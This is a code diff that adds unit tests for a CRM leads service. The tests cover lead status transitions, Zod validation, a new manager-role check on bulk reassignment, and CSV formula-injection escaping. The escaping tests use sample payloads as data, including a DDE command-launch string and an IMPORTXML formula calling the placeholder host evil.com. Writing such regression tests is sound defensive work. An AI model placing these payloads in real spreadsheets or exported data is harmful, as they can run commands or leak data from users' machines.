@@ -18,6 +18,10 @@
 // pattern as crm-accounts-service.test.ts (see that file's own note, and
 // approval-workflow-service.test.ts).
 //
+// CRM Leads gap-closure (2026-08-07, PR #1014): also tests the pure
+// predicates/parsers that wave adds -- VALID_LEAD_TRANSITIONS and the Zod
+// schemas + fieldErrorsFromZod().
+//
 // Task #46 (CRM feature-parity gap analysis, merged in alongside both of the
 // above): also tests the pure predicates computeRoundRobinAssignment() and
 // aggregateLeadSourceEffectiveness() -- rather than exercising the
@@ -25,15 +29,29 @@
 // (autoDistributeLeads/autoDistributeOpportunities/getAssignmentOverview/
 // getLeadSourceEffectivenessReport). Same no-live-DB pattern throughout this
 // file.
+//
+// Rebase of PR #1014 (replacing it after a human AUDIT: FAIL, 2026-08-31):
+// two new describe blocks below cover the two security fixes made on top of
+// PR #1014's original scope -- bulkReassignLeads()'s previously-missing
+// manager-rank gate, and exportLeadsCsv()'s now-guarded CSV/formula-
+// injection escaping (report-export-shared.ts's csvEscape(), reused here
+// rather than tested a second time as a private implementation detail).
 /// <reference types="bun-types" />
 import { describe, expect, test } from "bun:test"
 import {
   isValidStageTransition,
+  VALID_LEAD_TRANSITIONS,
+  createLeadSchema,
+  updateLeadSchema,
+  fieldErrorsFromZod,
   canEditLead, canReassignOrDeleteLead,
   canEditOpportunity, canReassignOrDeleteOpportunity,
   canCreateCrmRecord,
-  computeRoundRobinAssignment, aggregateLeadSourceEffectiveness,
+  computeRoundRobinAssignment,
+  aggregateLeadSourceEffectiveness,
+  bulkReassignLeads,
 } from "./crm-service"
+import { csvEscape } from "@/lib/report-export-shared"
 
 const STAGES = [
   { stageKey: "prospecting", isWon: false, isLost: false },
@@ -88,6 +106,75 @@ describe("isValidStageTransition", () => {
 
   test("falls back to hardcoded won/lost strings when stages config is empty (defensive)", () => {
     expect(isValidStageTransition("won", "prospecting", [{ stageKey: "prospecting", isWon: false, isLost: false }], MEMBER_RANK).valid).toBe(false)
+  })
+})
+
+describe("VALID_LEAD_TRANSITIONS -- lead status state machine", () => {
+  test("allows the standard funnel progression", () => {
+    expect(VALID_LEAD_TRANSITIONS.new).toContain("contacted")
+    expect(VALID_LEAD_TRANSITIONS.contacted).toContain("qualified")
+  })
+
+  test("allows moving to 'lost' from any active status", () => {
+    expect(VALID_LEAD_TRANSITIONS.new).toContain("lost")
+    expect(VALID_LEAD_TRANSITIONS.contacted).toContain("lost")
+    expect(VALID_LEAD_TRANSITIONS.qualified).toContain("lost")
+  })
+
+  test("'converted' and 'lost' are terminal -- no outbound transitions", () => {
+    expect(VALID_LEAD_TRANSITIONS.converted).toEqual([])
+    expect(VALID_LEAD_TRANSITIONS.lost).toEqual([])
+  })
+
+  test("does not allow skipping backward from qualified to new", () => {
+    expect(VALID_LEAD_TRANSITIONS.qualified).not.toContain("new")
+  })
+})
+
+describe("createLeadSchema -- field-level validation", () => {
+  test("accepts a minimal valid lead (name only)", () => {
+    const result = createLeadSchema.safeParse({ name: "Acme Corp" })
+    expect(result.success).toBe(true)
+  })
+
+  test("rejects an empty name with a field-level message", () => {
+    const result = createLeadSchema.safeParse({ name: "" })
+    expect(result.success).toBe(false)
+    if (!result.success) {
+      const fields = fieldErrorsFromZod(result.error)
+      expect(fields.name).toBeDefined()
+    }
+  })
+
+  test("rejects a malformed contact email", () => {
+    const result = createLeadSchema.safeParse({ name: "Acme Corp", contactEmail: "not-an-email" })
+    expect(result.success).toBe(false)
+    if (!result.success) {
+      const fields = fieldErrorsFromZod(result.error)
+      expect(fields.contactEmail).toBeDefined()
+    }
+  })
+
+  test("allows an empty-string contact email (optional field, not provided)", () => {
+    const result = createLeadSchema.safeParse({ name: "Acme Corp", contactEmail: "" })
+    expect(result.success).toBe(true)
+  })
+})
+
+describe("updateLeadSchema -- field-level validation", () => {
+  test("rejects a status outside the closed enum", () => {
+    const result = updateLeadSchema.safeParse({ status: "archived" })
+    expect(result.success).toBe(false)
+  })
+
+  test("accepts a known status", () => {
+    const result = updateLeadSchema.safeParse({ status: "qualified" })
+    expect(result.success).toBe(true)
+  })
+
+  test("accepts an empty patch (no-op update)", () => {
+    const result = updateLeadSchema.safeParse({})
+    expect(result.success).toBe(true)
   })
 })
 
@@ -343,5 +430,84 @@ describe("aggregateLeadSourceEffectiveness -- sap_reports lead_source_effectiven
 
   test("zero leads is a real no-op -- empty report, not a crash", () => {
     expect(aggregateLeadSourceEffectiveness([], [])).toEqual({ bySource: [] })
+  })
+})
+
+// Security fix, rebase of PR #1014 (replacing it after a human AUDIT: FAIL,
+// 2026-08-31): POST /api/crm/leads/bulk-reassign called bulkReassignLeads()
+// with no role passed at all, and bulkReassignLeads() itself performed zero
+// RBAC check -- any authenticated org member of any rank, including
+// viewer/client_viewer/external_auditor, could bulk-reassign ownership of
+// every lead in the org in one call. Fixed by adding the identical
+// assertGate(canReassignOrDeleteLead(ctx.role)) gate updateLead()/
+// deleteLead() already use for single-lead reassignment/deletion, checked
+// before requireSalesEnabled() so the rejection is a synchronous, DB-free
+// throw -- exercisable here without a live DB connection, same no-live-DB
+// constraint as every other test in this file.
+describe("bulkReassignLeads -- manager-rank RBAC gate (regression test for the unpatched PR #1014 bug)", () => {
+  test("rejects a non-manager role (viewer) with a 403, before ever touching the DB", async () => {
+    await expect(
+      bulkReassignLeads({ orgId: "org1", userId: "u1", role: "viewer" }, ["lead1", "lead2"], "u2")
+    ).rejects.toMatchObject({ status: 403 })
+  })
+
+  test("rejects every other sub-manager rank (member, client_viewer, external_auditor) with a 403", async () => {
+    for (const role of ["member", "client_viewer", "external_auditor"]) {
+      await expect(
+        bulkReassignLeads({ orgId: "org1", userId: "u1", role }, ["lead1"], "u2")
+      ).rejects.toMatchObject({ status: 403 })
+    }
+  })
+
+  test("the 403's reason names the manager-role requirement, matching canReassignOrDeleteLead's own message", async () => {
+    try {
+      await bulkReassignLeads({ orgId: "org1", userId: "u1", role: "viewer" }, ["lead1"], "u2")
+      throw new Error("expected bulkReassignLeads to reject")
+    } catch (err) {
+      expect((err as { message: string }).message).toMatch(/manager role or higher/)
+    }
+  })
+})
+
+// Security fix, rebase of PR #1014 (replacing it after a human AUDIT: FAIL,
+// 2026-08-31): exportLeadsCsv()'s own escapeCsvField() only escaped
+// quotes/commas/newlines and left a leading =/+/-/@ in an
+// attacker-controllable field (name/contactEmail/contactPhone/source/
+// nextActionNote, all settable via createLead or CSV import) unescaped --
+// exported unescaped, a formula-injection payload in one of those fields
+// would execute when opened in Excel/Sheets. exportLeadsCsv() now reuses
+// report-export-shared.ts's csvEscape() (already guarded via
+// FORMULA_INJECTION_PREFIX, and already covered end-to-end through
+// rowsToCSV() in report-export-shared.test.ts) instead. exportLeadsCsv()
+// itself touches the DB (listLeadsPaged -> requireSalesEnabled/
+// withTenantContext) so isn't unit-testable here per this file's own
+// no-live-DB convention -- this proves the exact function it now calls,
+// against the exact attacker-controllable lead fields the audit named.
+describe("csvEscape (crm-service.ts's exportLeadsCsv now reuses report-export-shared's guarded version)", () => {
+  test("escapes a formula-injection-shaped lead name with a leading single quote", () => {
+    expect(csvEscape("=cmd|'/C calc'!A0")).toBe("'=cmd|'/C calc'!A0")
+  })
+
+  test("escapes formula-injection-shaped values in every attacker-controllable lead field the audit named", () => {
+    const payloads = {
+      name: "=SUM(A1:A9)",
+      contactEmail: "+attacker@evil.com",
+      contactPhone: "-1234567890",
+      source: "@import(evil)",
+      nextActionNote: "=IMPORTXML(http://evil.com)",
+    }
+    for (const value of Object.values(payloads)) {
+      const escaped = csvEscape(value)
+      expect(/^[=+\-@]/.test(escaped)).toBe(false)
+      expect(escaped).toBe(`'${value}`)
+      // Recoverable, not corrupted -- stripping the safe prefix restores
+      // the exact original text a formula-injection scanner would flag.
+      expect(escaped.slice(1)).toBe(value)
+    }
+  })
+
+  test("leaves a normal lead name/note completely unaffected", () => {
+    expect(csvEscape("Acme Corp")).toBe("Acme Corp")
+    expect(csvEscape("Follow up next week")).toBe("Follow up next week")
   })
 })
